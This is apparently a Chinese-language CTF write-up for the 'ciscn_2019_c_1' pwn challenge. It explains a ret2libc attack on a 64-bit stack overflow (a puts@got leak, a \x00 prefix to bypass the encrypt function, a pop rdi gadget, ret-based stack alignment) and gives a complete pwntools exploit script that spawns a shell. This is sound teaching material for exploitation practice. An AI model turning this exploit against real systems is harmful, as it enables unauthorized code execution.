# ciscn_2019_c_1

## 题目分析

- 首先是`checksec`检查程序，效果如下图

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-02_15-18-43.png)

可知该程序 具有`NX`保护，因为无法使用`ret2shllcode`；因为使用`ret2shellcode`需要将部分数据写入内存，并解析为代码来执行；很明显`NX`保证了**内存可写区域不可执行**；从而阻止了这一点

- 使用IDA反汇编，可以发现没有我们常用的`system`函数，然后分析程序；发现`encrypt`函数如下图所示

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-10-02_15-23-19.png)

- 该程序具有输入，但无输入长度限制，所以存在**栈溢出**
- 由于没有`system`函数，故常用的`ret2system`方法无法构建只能使用`ret2libc`方法

## exp构建要点

前面的内容已经明确所要使用的思想是`ret2libc`,该程序为64位

### 获取system函数地址

由于我们的程序中不存在`system`函数地址，也没有需要使用的`/bin/sh`字符串，但是我们可以知道，在程序调用的库函数`libc`中一定存在该函数与字符串，并且函数之间的相对偏移是固定的；尽管有的程序开启了`ALSR`保护。`libc`等库函数是随机动态的加载到程序中也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变；因此 我们可以获取程序中需要调用的`puts`函数，来**泄露`libc`的基地址**，从而得到我们想要的数据；

而`libc`的泄露涉及到 **延迟绑定机制**；具体内容参考 **plt和got表**文档



### paylaod以\x00开头

才需要注意：**在该题中，`encrypt`函数对与输入的字符串做了处理，可能会改变输入的payload数据，为了防止这一点，利用`strlen`以`\x00`截断为特点，在`payload`开头将第一个填充字母替换为`\x00`避免了后续的处理过程**



### libc基地址

要注意 `libc`的基地址一定是 `0x7f`开头 共六字节；例如`0x7fe75fe479d0`；如果出现了 `a`开头，需要注意地址截断方式；`0xa`是`\n`，换行符；`puts`函数在输出字符串后，会输出一个`\n`;



### 参数传递

在我们构建调用`system`的函数过程中，需要给`system`传递参数 `/bin/sh`,所以我们需要注意传递参数的方式

**在64bit程序中，六个参数是通过rdi,rsi,rdx,rcx,r8 和 r9进行传递的，其余的通过栈传递；所以要使用 gadget 片段，来将目标值填充到对应寄存器**

**在32bit程序中，使用的是栈传递参数**



### 栈对齐

特别注意到题目是部署在Ubuntu18上的，因此调用`system`需要栈对齐，这里填充ret来对齐；详细说明见如下链接

主要原因是[[原创\]CTF 100步getshell之就差一步——The MOVAPS issue-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-269597.htm)

https://www.cnblogs.com/Rookle/p/12871878.html

简单总结：就是在64位的机器上，当你要调用printf或是system时，请保证`rsp&0xf==0`，说人话就是16字节对齐，最后4比特为0。当不满足上述条件的时候就报错。

## EXP

```python
#! /usr/bin/env python3
from pwn import *
from LibcSearcher import *

# ret2lic

io = process("/home/always/PWN/ciscn_2019_c_1")
# ELF模块用于获取ELF文件的信息
e = ELF("/home/always/PWN/ciscn_2019_c_1")
#显示调试信息，方便调试
context(os='linux', arch='amd64', log_level='debug')

offset = 87     #rbp -0x50  0x50 = 80 ; 80+8 =88byte

puts_plt_addr = e.plt["puts"]         #get pust() plt addr
puts_got_addr = e.got["puts"]          #get puts() got addr
main_addr = e.symbols["main"]


#change to input the plaintxt,it's the first time to input payload
io.sendlineafter("Input your choice!","1")

#ROPgadget --binary ciscn_2019_c_1 |grep "pop rdi" ; to get the "pop rai; ret" addr  0x0000000000400c83
pop_rdi_ret_addr = 0x0400c83
#pause()
#use the puts function to output the puts@got addr and ret to the main to inpupt the payload2
payload1 = b"\x00" + offset*b"A" + p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
io.sendlineafter("Input your Plaintext to be encrypted",payload1)
#----------------payload1 finish --------------------------------------------
io.recvuntil("Ciphertext\n")

io.recvline()
#puts_leak= u64(io.recvline()[0:8].ljust(8,b'\x00'))
puts_leak= u64(io.recvuntil("\n",drop=True).ljust(8,b'\x00'))
libc = LibcSearcher("puts",puts_leak)
log.success('puts_leak_addr => {}'.format(hex(puts_leak)))
libc_base = puts_leak - libc.dump("puts")
sys_addr  = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")
ret = 0x04006b9         #使system位置 栈对齐 ubuntu18 以上要求 按16字节对齐
payload2 = b"\x00" + offset*b"A" +p64(ret) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(sys_addr) +8*b'A'
#----------------payload2 finish --------------------------------------------
io.sendlineafter("Input your choice!","1")
io.sendlineafter("Input your Plaintext to be encrypted",payload2)

io.interactive()
```

